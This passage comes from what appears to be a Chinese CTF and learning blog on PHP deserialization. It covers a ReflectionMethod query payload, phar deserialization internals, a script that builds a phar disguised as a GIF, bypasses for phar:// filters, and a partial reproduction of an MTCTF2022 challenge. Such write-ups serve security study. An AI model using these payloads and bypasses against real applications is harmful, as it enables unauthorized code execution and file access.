</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];    <span class="comment">// 传入原生类名</span></span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];    <span class="comment">// 传入类属性</span></span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];    <span class="comment">// 传入类属性</span></span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];    <span class="comment">// 传入类方法</span></span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);    <span class="comment">// 实例化刚才传入的原生类</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());     <span class="comment">// 调用类中的方法</span></span><br></pre></td></tr></table></figure>
<p>首先看到这两行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure>
<p>类似于上面的题，需要利用原生类</p>
<p>这个题，我开始想到还是用<code>FilesystemIterator</code></p>
<p>如果得到文件路径，然后还是用<code>SplFileObject</code>来读取文件内容</p>
<p>但是这个考<code>ReflectionMethod</code></p>
<p>猜测flag在注释中</p>
<p>直接构造payload,即可得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</span><br></pre></td></tr></table></figure>
<h3 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> Phar反序列化</h3>
<p>phar反序列化即在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<code>phar://伪协议</code>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
<h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4>
<p>首先了解一下phar文件的结构，一个phar文件由四部分构成：</p>
<ul>
<li>
<p>a <strong>stub</strong>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
</li>
<li>
<p>a <strong>manifest</strong> describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<strong>meta-data</strong>，这是上述攻击手法最核心的地方。</p>
</li>
<li>
<p>the file <strong>contents</strong>：被压缩文件的内容。</p>
</li>
<li>
<p>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)：签名，放在末尾，用于确认phar文件完整性。</p>
</li>
</ul>
<h4 id="demo-2"><a class="markdownIt-Anchor" href="#demo-2"></a> Demo</h4>
<p>注：生成phar文件需要将php.ini中的phar.readonly选项设置为off，否则无法生成phar文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007152134587-166727395787412.png" alt="meta-data"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问之后就会生成phar.phar文件，打开查看，会看到meta-data是以序列化的形式存储的：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007150717433-166727395787413.png" alt="meta-data"></p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>filectime</th>
<th>file_exists</th>
<th>file_get_contents</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_put_conents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<p>实际上，只要调用了<code>php_stream_open_wrapper</code>的函数，都存在这样的问题，因此受影响的还有下列函数：</p>
<p><strong>exif</strong></p>
<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
<p><strong>gd</strong></p>
<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom</code></li>
</ul>
<p><strong>hash</strong></p>
<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
<p><strong>file / url</strong></p>
<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>mime_content_type</code></li>
</ul>
<p><strong>standard</strong></p>
<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<p><strong>finfo</strong></p>
<ul>
<li><code>finfo_file</code></li>
<li><code>finfo_buffer</code></li>
</ul>
<p><strong>zip</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;TW.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span> -&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://phar.phar/***&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>Postgres</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;pgsql:host%s;dbname=%s;user=%s;password=%s;&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;postgres&quot;</span>,<span class="string">&quot;TW&quot;</span>,<span class="string">&#x27;123520&#x27;</span>));</span><br><span class="line">@<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">pgsqlCopyFromFile</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;phar://phar.phar/aaa&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="trick"><a class="markdownIt-Anchor" href="#trick"></a> Trick</h4>
<p>过滤了phar://协议，绕过姿势：</p>
<ul>
<li><code>compress.bzip2://phar://</code></li>
<li><code>compress.zlib://phar:///</code></li>
<li><code>php://filter/resource=phar://</code></li>
</ul>
<blockquote>
<p>同时，还可以将伪造phar为其他格式的文件。</p>
<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007234558245-166727395787414.png" alt="伪造"></p>
<p>理论到这就差不多了，接下来讲一个2022MT决赛的复现题目，讲不明白的话，师傅们记得锤我。</p>
<h4 id="漏洞条件"><a class="markdownIt-Anchor" href="#漏洞条件"></a> 漏洞条件</h4>
<p>1、phar文件能够上传至服务器<br>
即要求存在file_get_contents()、fopen()这种函数</p>
<p>2、要有可利用的魔术方法<br>
这个的话用一位大师傅的话说就是利用魔术方法作为&quot;跳板&quot;</p>
<p>3、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤<br>
一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是<code>Phar://</code>这种，如果这几个特殊字符被过滤就无法实现反序列化</p>
<h4 id="赛题复现"><a class="markdownIt-Anchor" href="#赛题复现"></a> 赛题复现</h4>
<h5 id="mtctf2022决赛"><a class="markdownIt-Anchor" href="#mtctf2022决赛"></a> <s>MTCTF2022决赛</s></h5>
<p>自己起了一个docker，我们先大概看一下题目吧。</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008000647522-166727395787415.png" alt="test01"></p>
<p>文件上传先简单的传个文件抓个包看一下，</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008002817077-166727395787416.png" alt="test02"></p>
<p>这里还没有去看源码，看到这个，就随便上传了一个码试了一下，发现图片上传后被发送到一个函数中处理。这里就意识到不是简单的文件上传了，决赛时也去啃源码了，但是没怎么啃明白，复现时间足够多，在加上Maxzed大师傅的wp总算啃明白了，源码太多，我就截重点来说吧。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里看Maxzed师傅的wp没看出来他怎么判断存在phar反序列化漏洞，这里自己又去细看了一下源码。</p>
<p><s>光看这个是没有任何思路的，再截一段重要的源码说一下，开讲前肯定吧源码发到群里了，师傅们有想法的可以自取。</s></p>
<p>按照phar反序列化的惯例就是要找可控的函数，那就找吧<s>审那么大一个玩意儿确实难受</s></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImagesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileNames</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">		<span class="variable">$images</span> = [];</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$fileNames</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$fileName</span>) &#123;<span class="comment">//每次循环中，当前数组元素的值被赋给 $fileName，当前数组元素的键名也会在每次循环中被赋给变量 $index。并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个数组元素），直到遍历到数组的末尾，停止遍历并退出循环。</span></span><br><span class="line">			<span class="variable">$images</span>[<span class="variable">$fileName</span>] = <span class="string">&#x27;data:image/&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) . <span class="string">&#x27;;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileName</span>));<span class="comment">//对每次循环的fileName进行base64编码</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;images&#x27;</span>, <span class="variable">$images</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageFile</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFiles</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">getReportedFilename</span>();<span class="comment">//获取fileName的一个函数，这里是读取imageFile的文件名并赋值给fileName</span></span><br><span class="line">		<span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">moveTo</span>(<span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;<span class="comment">//就这个函数，要是敏锐一些，应该就能猜到fileName可控，那么就要找触发点，接着审。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());<span class="comment">//可控的filename,这里可以用来触发phar</span></span><br><span class="line">		<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$post</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getPost</span>();</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$degrees</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;degrees&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">rotate</span>(<span class="variable">$degrees</span>);</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里来说一下fileName为啥是可控的,在Image构造函数中存在file_exists()来触发，同时在ediGet中filename进行get访问，即可用来触发phar</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008212336541-166727395787417.png" alt="test03"></p>
<p>那么接下来就是挖链子了，</p>
<p>初步审下来，我这里就直接用maxzed的链子了，我就解读一下他为啥会用这个链子</p>
